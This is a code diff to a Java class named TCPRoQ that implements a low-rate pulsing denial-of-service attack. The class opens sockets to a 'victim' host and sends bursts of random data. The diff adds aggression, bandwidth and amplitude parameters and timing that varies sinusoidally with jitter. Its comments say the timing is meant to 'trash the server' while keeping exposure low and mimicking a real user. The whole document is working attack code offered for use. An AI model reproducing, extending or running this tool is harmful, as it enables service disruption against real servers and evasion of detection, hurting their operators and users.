@@ -1,26 +1,34 @@
 package hardroq.networking;
 
-import hardroq.networking.TCPRoQ.Builder;
-
 import java.io.OutputStream;
 import java.net.Socket;
+import java.util.Date;
 import java.util.Random;
+import java.util.logging.Logger;
 
 public class TCPRoQ {
+	//Tools
+	private final Random random = new Random();
+	private Thread workerThread;
+	private Socket socket;
+	
 	//Parameters
 	private final String host;
 	private final int port;
 	private final String header;
 	private final String footer;
+	private final byte[] payload;
+	private final float bandwidth;
+	private int datasize;			// header + random data + footer
+	private int period;				// T
+	private int amplitude;			// δ
+	private int duration;			// t
+	private int timeout;			// T - t
+	private float aggression;		// M
 	
+
 	//Internals
-	private int datasize;
-	private int timeout;
 	private int RTT;
-	private final Object simpleLock = new Object();
-	private final Random random = new Random();
-	private Thread workerThread;
-	private Socket socket;
 	private boolean attacking = false;
 	
 	private TCPRoQ (Builder builder) {
@@ -30,6 +38,12 @@ public class TCPRoQ {
 		datasize = builder.datasize;
 		header = builder.header;
 		footer = builder.footer;
+		aggression = builder.aggression;
+		bandwidth = builder.bandwidth;  //this should be in kb/ms, which just happens to be the same as mb/s :)
+		
+		//for now, let's just const the payload
+		payload = (header + footer + "\r\n\r\n").getBytes();
+		workerThread = new Thread();
 	}
 	
 	public void InitiateAttack() {
@@ -48,38 +62,58 @@ public class TCPRoQ {
 	private Runnable work = new Runnable() {
 		@Override
 		public void run() {
-			try {
-				while (attacking) {
-				//Establish a connection to our victim
+			while (attacking) {
+				try {
+					//Establish a connection to our victim
 					socket = new Socket(host, port);
 				
 					/*
-					  Connection established, now the idea is to repeatedly send a burst of data
-					  after each burst, we will wait for a given amount of time
-					  then after we wait, we will repeat, only we will double the datasize and
-					  the timeout value until the victim disconnects us.
+					  Connection established, now the idea is to repeatedly send requests at an amplitude (rate)
+					  such that: amplitude = ((aggression * bandwidth) * duration) / datasize per second.
+					  
+					  duration will vary from between RTT ~ 2RTT in attempt to trash the server, while keeping exposure low
+					  
+					  period will vary sinusoidally between 8 ~ 20 RTT with a jitter of ±2 in order to simulate a real user 
 					*/
-					int c = 1;
-	
+					int c = 0;					
 					OutputStream out = socket.getOutputStream();
+					long l = 0;
 					while (socket.isConnected() && attacking) {
-						//create our payload buffer
-						final byte[] payload = new byte[datasize * c];
-						for (int i = burstcount; --i > 0;) {
+						//calculate the period for this attack round (in ms).
+						period = (RTT * ((8 + (int) Math.ceil(Math.sin(c / 12) * 12)) + (2 - random.nextInt(4))));
+						
+						if (++c > 12) c = 0;
+						
+						//calculate the duration for this attack round (in ms).
+						duration = (int) Math.ceil(RTT * (1 + random.nextFloat()));
+						
+						//calulate the amplitude for this attack
+						amplitude = (int) Math.ceil(((aggression * bandwidth) * duration) / (payload.length / 40));
+						
+						//calculate the timeout
+						timeout = period - duration;
+						
+						for (int i = amplitude; --i > 0;) {
 							//generate our crap data
 							random.nextBytes(payload);
 							
 							//send the data
 							out.write(payload);
 							out.flush();
+							//and just to be sure..
+							out.flush();
+							
+							//clear the input buffer
+							socket.getInputStream().skip(socket.getInputStream().available());
+							System.out.println(String.valueOf(++l) + ": Packet sent");
 						}
 						
-						//wait and increment c
-						simpleLock.wait(timeout * 1000 * c++);
+						//sleep for the timeout
+						Thread.sleep(timeout);
 					}
+				} catch (Exception ex) {
+					System.out.println(ex.getMessage());
 				}
-			} catch (Exception ex) {
-				//gulp for now
 			}
 		}
 	};
@@ -92,38 +126,50 @@ public class TCPRoQ {
 		private int datasize = 16 * 1024;
 		private String header = "";
 		private String footer = "";
+		private float aggression = 1.0f;
+		private float bandwidth = 1;  //1MB line
 		
 		public TCPRoQ build() {
 			return new TCPRoQ(this);
 		}
 		
-		public Builder host(String h) {
+		public Builder host(final String h) {
 			host = h;
 			return this;
 		}
 		
-		public Builder port (int p) {
+		public Builder port (final int p) {
 			port = p;
 			return this;
 		}
 		
-		public Builder RTT (int t) {
+		public Builder RTT (final int t) {
 			RTT = t;
 			return this;
 		}
 		
-		public Builder datasize (int d) {
+		public Builder datasize (final int d) {
 			datasize = d;
 			return this;
 		}
 
-		public Builder header(String h) {
+		public Builder header(final String h) {
 			header = h;
 			return this;
 		}
 		
-		public Builder footer(String f) {
+		public Builder footer(final String f) {
 			footer = f;
+			return this;
+		}
+		
+		public Builder aggression(final float a) {
+			aggression = a;
+			return this;
+		}
+		
+		public Builder bandwidth(final float b) {
+			bandwidth = b;
 			return this;
 		}
 	}
